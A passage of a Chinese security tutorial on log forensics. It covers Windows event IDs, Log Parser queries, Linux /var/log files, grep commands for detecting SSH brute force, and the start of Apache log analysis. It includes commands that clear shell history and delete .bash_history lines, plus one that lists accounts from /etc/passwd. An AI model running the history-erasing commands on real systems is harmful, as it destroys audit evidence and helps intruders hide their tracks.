\u7528\u6237\u5728\u672c\u5730\u8fdb\u884c\u767b\u5f55\u3002 3 \u7f51\u7edc\uff08Network\uff09 \u6700\u5e38\u89c1\u7684\u60c5\u51b5\u5c31\u662f\u8fde\u63a5\u5230\u5171\u4eab\u6587\u4ef6\u5939\u6216\u5171\u4eab\u6253\u5370\u673a\u65f6\u3002 4 \u6279\u5904\u7406\uff08Batch\uff09 \u901a\u5e38\u8868\u660e\u67d0\u8ba1\u5212\u4efb\u52a1\u542f\u52a8\u3002 5 \u670d\u52a1\uff08Service\uff09 \u6bcf\u79cd\u670d\u52a1\u90fd\u88ab\u914d\u7f6e\u5728\u67d0\u4e2a\u7279\u5b9a\u7684\u7528\u6237\u8d26\u53f7\u4e0b\u8fd0\u884c\u3002 7 \u89e3\u9501\uff08Unlock\uff09 \u5c4f\u4fdd\u89e3\u9501\u3002 8 \u7f51\u7edc\u660e\u6587\uff08NetworkCleartext\uff09 \u767b\u5f55\u7684\u5bc6\u7801\u5728\u7f51\u7edc\u4e0a\u662f\u901a\u8fc7\u660e\u6587\u4f20\u8f93\u7684\uff0c\u5982FTP\u3002 9 \u65b0\u51ed\u8bc1\uff08NewCredentials\uff09 \u4f7f\u7528\u5e26/Netonly\u53c2\u6570\u7684RUNAS\u547d\u4ee4\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\u3002 10 \u8fdc\u7a0b\u4ea4\u4e92\uff0c\uff08RemoteInteractive\uff09 \u901a\u8fc7\u7ec8\u7aef\u670d\u52a1\u3001\u8fdc\u7a0b\u684c\u9762\u6216\u8fdc\u7a0b\u534f\u52a9\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002 11 \u7f13\u5b58\u4ea4\u4e92\uff08CachedInteractive\uff09 \u4ee5\u4e00\u4e2a\u57df\u7528\u6237\u767b\u5f55\u800c\u53c8\u6ca1\u6709\u57df\u63a7\u5236\u5668\u53ef\u7528 \u5173\u4e8e\u66f4\u591aEVENT ID\uff0c\u8be6\u89c1\u5fae\u8f6f\u5b98\u65b9\u7f51\u7ad9\u4e0a\u627e\u5230\u4e86\u201cWindows Vista \u548c Windows Server 2008 \u4e2d\u7684\u5b89\u5168\u4e8b\u4ef6\u7684\u8bf4\u660e\u201d\u3002 \u539f\u6587\u94fe\u63a5 \uff1a https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 \u6848\u4f8b1\uff1a\u53ef\u4ee5\u5229\u7528eventlog\u4e8b\u4ef6\u6765\u67e5\u770b\u7cfb\u7edf\u8d26\u53f7\u767b\u5f55\u60c5\u51b5\uff1a \u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d**\uff1b \u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u5355\u51fb**\u201c\u5b89\u5168\u201d**\uff0c\u67e5\u770b\u5b89\u5168\u65e5\u5fd7\uff1b \u5728\u5b89\u5168\u65e5\u5fd7\u53f3\u4fa7\u64cd\u4f5c\u4e2d\uff0c\u70b9\u51fb**\u201c\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\u201d**\uff0c\u8f93\u5165\u4e8b\u4ef6ID\u8fdb\u884c\u7b5b\u9009\u3002 4624 --\u767b\u5f55\u6210\u529f 4625 --\u767b\u5f55\u5931\u8d25 4634 -- \u6ce8\u9500\u6210\u529f 4647 -- \u7528\u6237\u542f\u52a8\u7684\u6ce8\u9500 4672 -- \u4f7f\u7528\u8d85\u7ea7\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u8fdb\u884c\u767b\u5f55 \u6211\u4eec\u8f93\u5165\u4e8b\u4ef6ID\uff1a4625\u8fdb\u884c\u65e5\u5fd7\u7b5b\u9009\uff0c\u53d1\u73b0\u4e8b\u4ef6ID\uff1a4625\uff0c\u4e8b\u4ef6\u6570175904\uff0c\u5373\u7528\u6237\u767b\u5f55\u5931\u8d25\u4e86175904\u6b21\uff0c\u90a3\u4e48\u8fd9\u53f0\u670d\u52a1\u5668\u7ba1\u7406\u5458\u8d26\u53f7\u53ef\u80fd\u906d\u9047\u4e86\u66b4\u529b\u731c\u89e3\u3002 \u6848\u4f8b2\uff1a\u53ef\u4ee5\u5229\u7528eventlog\u4e8b\u4ef6\u6765\u67e5\u770b\u8ba1\u7b97\u673a\u5f00\u5173\u673a\u7684\u8bb0\u5f55\uff1a 1\u3001\u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d**\uff1b 2\u3001\u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u5355\u51fb**\u201c\u7cfb\u7edf\u201d**\uff0c\u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\uff1b 3\u3001\u5728\u7cfb\u7edf\u65e5\u5fd7\u53f3\u4fa7\u64cd\u4f5c\u4e2d\uff0c\u70b9\u51fb**\u201c\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\u201d**\uff0c\u8f93\u5165\u4e8b\u4ef6ID\u8fdb\u884c\u7b5b\u9009\u3002 \u5176\u4e2d\u4e8b\u4ef6ID 6006 ID6005\u3001 ID 6009\u5c31\u8868\u793a\u4e0d\u540c\u72b6\u6001\u7684\u673a\u5668\u7684\u60c5\u51b5\uff08\u5f00\u5173\u673a\uff09\u3002 6005 \u4fe1\u606f EventLog \u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u5df2\u542f\u52a8\u3002(\u5f00\u673a) 6006 \u4fe1\u606f EventLog \u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u5df2\u505c\u6b62\u3002(\u5173\u673a) 6009 \u4fe1\u606f EventLog \u6309ctrl\u3001alt\u3001delete\u952e(\u975e\u6b63\u5e38)\u5173\u673a \u6211\u4eec\u8f93\u5165\u4e8b\u4ef6ID\uff1a6005-6006\u8fdb\u884c\u65e5\u5fd7\u7b5b\u9009\uff0c\u53d1\u73b0\u4e86\u4e24\u6761\u57282018/7/6 17:53:51\u5de6\u53f3\u7684\u8bb0\u5f55\uff0c\u4e5f\u5c31\u662f\u6211\u521a\u624d\u5bf9\u7cfb\u7edf\u8fdb\u884c\u91cd\u542f\u7684\u65f6\u95f4\u3002 0x04 \u65e5\u5fd7\u5206\u6790\u5de5\u5177 \u00b6 Log Parser \u00b6 Log Parser\uff08\u662f\u5fae\u8f6f\u516c\u53f8\u51fa\u54c1\u7684\u65e5\u5fd7\u5206\u6790\u5de5\u5177\uff0c\u5b83\u529f\u80fd\u5f3a\u5927\uff0c\u4f7f\u7528\u7b80\u5355\uff0c\u53ef\u4ee5\u5206\u6790\u57fa\u4e8e\u6587\u672c\u7684\u65e5\u5fd7\u6587\u4ef6\u3001XML \u6587\u4ef6\u3001CSV\uff08\u9017\u53f7\u5206\u9694\u7b26\uff09\u6587\u4ef6\uff0c\u4ee5\u53ca\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e8b\u4ef6\u65e5\u5fd7\u3001\u6ce8\u518c\u8868\u3001\u6587\u4ef6\u7cfb\u7edf\u3001Active Directory\u3002\u5b83\u53ef\u4ee5\u50cf\u4f7f\u7528 SQL \u8bed\u53e5\u4e00\u6837\u67e5\u8be2\u5206\u6790\u8fd9\u4e9b\u6570\u636e\uff0c\u751a\u81f3\u53ef\u4ee5\u628a\u5206\u6790\u7ed3\u679c\u4ee5\u5404\u79cd\u56fe\u8868\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 Log Parser 2.2\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=24659 Log Parser \u4f7f\u7528\u793a\u4f8b\uff1a https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/ \u57fa\u672c\u67e5\u8be2\u7ed3\u6784 Logparser.exe \u2013i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\xx.evtx\" \u4f7f\u7528Log Parser\u5206\u6790\u65e5\u5fd7 1\u3001\u67e5\u8be2\u767b\u5f55\u6210\u529f\u7684\u4e8b\u4ef6 \u767b\u5f55\u6210\u529f\u7684\u6240\u6709\u4e8b\u4ef6 LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" \u6307\u5b9a\u767b\u5f55\u65f6\u95f4\u8303\u56f4\u7684\u4e8b\u4ef6\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where TimeGenerated>'2018-06-19 23:32:11' and TimeGenerated<'2018-06-20 23:34:00' and EventID=4624\" \u63d0\u53d6\u767b\u5f55\u6210\u529f\u7684\u7528\u6237\u540d\u548cIP\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\" 2\u3001\u67e5\u8be2\u767b\u5f55\u5931\u8d25\u7684\u4e8b\u4ef6 \u767b\u5f55\u5931\u8d25\u7684\u6240\u6709\u4e8b\u4ef6\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4625\" \u63d0\u53d6\u767b\u5f55\u5931\u8d25\u7528\u6237\u540d\u8fdb\u884c\u805a\u5408\u7edf\u8ba1\uff1a LogParser.exe -i:EVT \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" 3\u3001\u7cfb\u7edf\u5386\u53f2\u5f00\u5173\u673a\u8bb0\u5f55\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\" LogParser Lizard \u00b6 \u5bf9\u4e8eGUI\u73af\u5883\u7684Log Parser Lizard\uff0c\u5176\u7279\u70b9\u662f\u6bd4\u8f83\u6613\u4e8e\u4f7f\u7528\uff0c\u751a\u81f3\u4e0d\u9700\u8981\u8bb0\u5fc6\u7e41\u7410\u7684\u547d\u4ee4\uff0c\u53ea\u9700\u8981\u505a\u597d\u8bbe\u7f6e\uff0c\u5199\u597d\u57fa\u672c\u7684SQL\u8bed\u53e5\uff0c\u5c31\u53ef\u4ee5\u76f4\u89c2\u7684\u5f97\u5230\u7ed3\u679c\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.lizard-labs.com/log_parser_lizard.aspx \u4f9d\u8d56\u5305\uff1aMicrosoft .NET Framework 4 .5\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=42642 \u67e5\u8be2\u6700\u8fd1\u7528\u6237\u767b\u5f55\u60c5\u51b5\uff1a Event Log Explorer \u00b6 Event Log Explorer\u662f\u4e00\u6b3e\u975e\u5e38\u597d\u7528\u7684Windows\u65e5\u5fd7\u5206\u6790\u5de5\u5177\u3002\u53ef\u7528\u4e8e\u67e5\u770b\uff0c\u76d1\u89c6\u548c\u5206\u6790\u8ddf\u4e8b\u4ef6\u8bb0\u5f55\uff0c\u5305\u62ec\u5b89\u5168\uff0c\u7cfb\u7edf\uff0c\u5e94\u7528\u7a0b\u5e8f\u548c\u5176\u4ed6\u5fae\u8f6fWindows \u7684\u8bb0\u5f55\u88ab\u8bb0\u8f7d\u7684\u4e8b\u4ef6\uff0c\u5176\u5f3a\u5927\u7684\u8fc7\u6ee4\u529f\u80fd\u53ef\u4ee5\u5feb\u901f\u7684\u8fc7\u6ee4\u51fa\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://event-log-explorer.en.softonic.com/ \u53c2\u8003\u94fe\u63a5\uff1a Windows\u65e5\u5fd7\u5206\u6790 https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ \u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790 \u00b6 0x00 \u524d\u8a00 \u00b6 Linux\u7cfb\u7edf\u62e5\u6709\u975e\u5e38\u7075\u6d3b\u548c\u5f3a\u5927\u7684\u65e5\u5fd7\u529f\u80fd\uff0c\u53ef\u4ee5\u4fdd\u5b58\u51e0\u4e4e\u6240\u6709\u7684\u64cd\u4f5c\u8bb0\u5f55\uff0c\u5e76\u53ef\u4ee5\u4ece\u4e2d\u68c0\u7d22\u51fa\u6211\u4eec\u9700\u8981\u7684\u4fe1\u606f\u3002 \u672c\u6587\u7b80\u4ecb\u4e00\u4e0bLinux\u7cfb\u7edf\u65e5\u5fd7\u53ca\u65e5\u5fd7\u5206\u6790\u6280\u5de7\u3002 0x01 \u65e5\u5fd7\u7b80\u4ecb \u00b6 \u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log/ \u67e5\u770b\u65e5\u5fd7\u914d\u7f6e\u60c5\u51b5\uff1amore /etc/rsyslog.conf \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d \u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u65e5\u5fd7\uff1a \u767b\u5f55\u5931\u8d25\u8bb0\u5f55\uff1a/var/log/btmp //lastb \u6700\u540e\u4e00\u6b21\u767b\u5f55\uff1a/var/log/lastlog //lastlog \u767b\u5f55\u6210\u529f\u8bb0\u5f55: /var/log/wtmp //last \u767b\u5f55\u65e5\u5fd7\u8bb0\u5f55\uff1a/var/log/secure \u76ee\u524d\u767b\u5f55\u7528\u6237\u4fe1\u606f\uff1a/var/run/utmp //w\u3001who\u3001users \u5386\u53f2\u547d\u4ee4\u8bb0\u5f55\uff1ahistory \u4ec5\u6e05\u7406\u5f53\u524d\u7528\u6237\uff1a history -c 0x02 \u65e5\u5fd7\u5206\u6790\u6280\u5de7 \u00b6 A\u3001\u5e38\u7528\u7684shell\u547d\u4ee4 \u00b6 Linux\u4e0b\u5e38\u7528\u7684shell\u547d\u4ee4\u5982\uff1afind\u3001grep \u3001egrep\u3001awk\u3001sed \u5c0f\u6280\u5de7\uff1a 1\u3001grep\u663e\u793a\u524d\u540e\u51e0\u884c\u4fe1\u606f: \u6807\u51c6unix/linux\u4e0b\u7684grep\u901a\u8fc7\u4e0b\u9762\u53c3\u6570\u63a7\u5236\u4e0a\u4e0b\u6587\uff1a grep -C 5 foo file \u663e\u793afile\u6587\u4ef6\u91cc\u5339\u914dfoo\u5b57\u4e32\u90a3\u884c\u4ee5\u53ca\u4e0a\u4e0b5\u884c grep -B 5 foo file \u663e\u793afoo\u53ca\u524d5\u884c grep -A 5 foo file \u663e\u793afoo\u53ca\u540e5\u884c \u67e5\u770bgrep\u7248\u672c\u53f7\u7684\u65b9\u6cd5\u662f grep -V 2\u3001grep \u67e5\u627e\u542b\u6709\u67d0\u5b57\u7b26\u4e32\u7684\u6240\u6709\u6587\u4ef6 grep -rn \"hello,world!\" * : \u8868\u793a\u5f53\u524d\u76ee\u5f55\u6240\u6709\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u67d0\u4e2a\u6587\u4ef6\u540d -r \u662f\u9012\u5f52\u67e5\u627e -n \u662f\u663e\u793a\u884c\u53f7 -R \u67e5\u627e\u6240\u6709\u6587\u4ef6\u5305\u542b\u5b50\u76ee\u5f55 -i \u5ffd\u7565\u5927\u5c0f\u5199 3\u3001\u5982\u4f55\u663e\u793a\u4e00\u4e2a\u6587\u4ef6\u7684\u67d0\u51e0\u884c\uff1a cat input_file | tail -n +1000 | head -n 2000 #\u4ece\u7b2c1000\u884c\u5f00\u59cb\uff0c\u663e\u793a2000\u884c\u3002\u5373\u663e\u793a1000~2999\u884c 4\u3001find /etc -name init //\u5728\u76ee\u5f55/etc\u4e2d\u67e5\u627e\u6587\u4ef6init 5\u3001\u53ea\u662f\u663e\u793a/etc/passwd\u7684\u8d26\u6237 `cat /etc/passwd |awk -F ':' '{print $1}'` //awk -F\u6307\u5b9a\u57df\u5206\u9694\u7b26\u4e3a':'\uff0c\u5c06\u8bb0\u5f55\u6309\u6307\u5b9a\u7684\u57df\u5206\u9694\u7b26\u5212\u5206\u57df\uff0c\u586b\u5145\u57df\uff0c$0\u5219\u8868\u793a\u6240\u6709\u57df,$1\u8868\u793a\u7b2c\u4e00\u4e2a\u57df,$n\u8868\u793a\u7b2cn\u4e2a\u57df\u3002 6\u3001sed -i '153,$d' .bash_history \u5220\u9664\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55\uff0c\u53ea\u4fdd\u7559\u524d153\u884c B\u3001\u65e5\u5fd7\u5206\u6790\u6280\u5de7 \u00b6 A\u3001/var/log/secure 1\u3001\u5b9a\u4f4d\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673a\u7684root\u5e10\u53f7\uff1a grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1a grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c \u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2\u3001\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3\u3001\u589e\u52a0\u4e00\u4e2a\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4\u3001\u5220\u9664\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5\u3001su\u5207\u6362\u7528\u6237\uff1a Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo\u6388\u6743\u6267\u884c: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 2\u3001/var/log/yum.log \u8f6f\u4ef6\u5b89\u88c5\u5347\u7ea7\u5378\u8f7d\u65e5\u5fd7\uff1a ~~~yum install gcc yum install gcc [root@bogon ~]# more /var/log/yum.log Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 ~ \u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790 \u00b6 ox01 Web\u65e5\u5fd7 \u00b6 Web\u8bbf\u95ee\u65e5\u5fd7\u8bb0\u5f55\u4e86Web\u670d\u52a1\u5668\u63a5\u6536\u5904\u7406\u8bf7\u6c42\u53ca\u8fd0\u884c\u65f6\u9519\u8bef\u7b49\u5404\u79cd\u539f\u59cb\u4fe1\u606f\u3002\u901a\u8fc7\u5bf9WEB\u65e5\u5fd7\u8fdb\u884c\u7684\u5b89\u5168\u5206\u6790\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9a\u4f4d\u653b\u51fb\u8005\uff0c\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u8fd8\u539f\u653b\u51fb\u8def\u5f84\uff0c\u627e\u5230\u7f51\u7ad9\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u5e76\u8fdb\u884c\u4fee\u590d\u3002 \u6211\u4eec\u6765\u770b\u4e00\u6761Apache\u7684\u8bbf\u95ee\u65e5\u5fd7\uff1a 127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] \"GET /login.html HTTP/1.1\" 200 786 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36\" \u901a\u8fc7\u8fd9\u6761Web\u8bbf\u95ee\u65e5\u5fd7\uff0c\u6211\u4eec\u53ef\u4ee5\u6e05\u695a\u7684\u5f97\u77e5\u7528\u6237\u5728\u4ec0\u4e48IP\u3001\u4ec0\u4e48\u65f6\u95f4\u3001\u7528\u4ec0\u4e48\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ec0\u4e48\u6d4f\u89c8\u5668\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e86\u4f60\u7f51\u7ad9\u7684\u54ea\u4e2a\u9875\u9762\uff0c\u662f\u5426\u8bbf\u95ee\u6210\u529f\u3002 \u672c\u6587\u901a\u8fc7\u4ecb\u7ecdWeb\u65e5\u5fd7\u5b89\u5168\u5206\u6790\u65f6\u7684\u601d\u8def\u548c\u5e38\u7528\u7684\u4e00\u4e9b\u6280\u5de7\u3002 0x02 \u65e5\u5fd7\u5206\u6790\u6280\u5de7 \u00b6 \u5728\u5bf9WEB\u65e5\u5fd7\u8fdb\u884c\u5b89\u5168\u5206\u6790\u65f6\uff0c\u4e00\u822c\u53ef\u4ee5\u6309\u7167\u4e24\u79cd\u601d\u8def\u5c55\u5f00\uff0c\u9010\u6b65\u6df1\u5165\uff0c\u8fd8\u539f\u6574\u4e2a\u653b\u51fb\u8fc7\u7a0b\u3002 \u7b2c\u4e00\u79cd\uff1a\u786e\u5b9a\u5165\u4fb5\u7684\u65f6\u95f4\u8303\u56f4\uff0c\u4ee5\u6b64\u4e3a\u7ebf\u7d22\uff0c\u67e5\u627e\u8fd9\u4e2a\u65f6\u95f4\u8303\u56f4\u5185\u53ef\u7591\u7684\u65e5\u5fd7\uff0c\u8fdb\u4e00\u6b65\u6392\u67e5\uff0c\u6700\u7ec8\u786e\u5b9a\u653b\u51fb\u8005\uff0c\u8fd8\u539f\u653b\u51fb\u8fc7\u7a0b\u3002 \u7b2c\u4e8c\u79cd\uff1a\u653b\u51fb\u8005\u5728\u5165\u4fb5\u7f51\u7ad9\u540e\uff0c\u901a\u5e38\u4f1a\u7559\u4e0b\u540e\u95e8\u7ef4\u6301\u6743\u9650\uff0c\u4ee5\u65b9\u4fbf\u518d\u6b21\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u8be5\u6587\u4ef6\uff0c\u5e76\u4ee5\u6b64\u4e3a\u7ebf\u7d22\u6765\u5c55\u5f00\u5206\u6790\u3002 \u5e38\u7528\u5206\u6790\u5de5\u5177\uff1a Window\u4e0b\uff0c\u63a8\u8350\u7528 EmEditor \u8fdb\u884c\u65e5\u5fd7\u5206\u6790\uff0c\u652f\u6301\u5927\u6587\u672c\uff0c\u641c\u7d22\u6548\u7387\u8fd8\u4e0d\u9519\u3002 Linux\u4e0b\uff0c\u4f7f\u7528Shell\u547d\u4ee4\u7ec4\u5408\u67e5\u8be2\u5206\u6790\u3002 Shell+Linux\u547d\u4ee4\u5b9e\u73b0\u65e5\u5fd7\u5206\u6790\uff0c\u4e00\u822c\u7ed3\u5408grep\u3001awk\u7b49\u547d\u4ee4\u7b49\u5b9e\u73b0\u4e86\u51e0\u4e2a\u5e38\u7528\u7684\u65e5\u5fd7\u5206\u6790\u7edf\u8ba1\u6280\u5de7\u3002 Apache\u65e5\u5fd7\u5206\u6790\u6280\u5de7\uff1a 1\u3001\u5217\u51fa\u5f53\u5929\u8bbf\u95ee\u6b21\u6570\u6700\u591a\u7684IP\u547d\u4ee4\uff1a cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2\u3001\u67e5\u770b\u5f53\u5929\u6709\u591a\u5c11\u4e2aIP\u8bbf\u95ee\uff1a awk '{print $1}' log_file|sort|uniq|wc -l 3\u3001\u67e5\u770b\u67d0\u4e00\u4e2a\u9875\u9762\u88ab\u8bbf\u95ee\u7684\u6b21\u6570\uff1a grep \"/index.php\" 